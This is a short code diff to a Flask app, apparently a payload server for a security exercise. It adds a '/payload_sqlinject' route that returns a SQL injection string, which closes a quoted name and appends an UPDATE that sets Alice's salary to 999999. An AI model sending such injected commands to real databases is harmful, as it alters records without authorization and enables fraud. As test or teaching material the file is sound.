@@ -6,6 +6,10 @@ app = Flask(__name__)
 def get_payload():
     return "111-1111111"
 
+@app.route('/payload_sqlinject', methods=['GET'])
+def get_sql():
+    return "Alice'; UPDATE salary SET salary=999999 WHERE name='Alice'; --"
+
 # @app.route('/chasetheflag', methods=['POST'])
 # def receive_data():
 #     dict = {
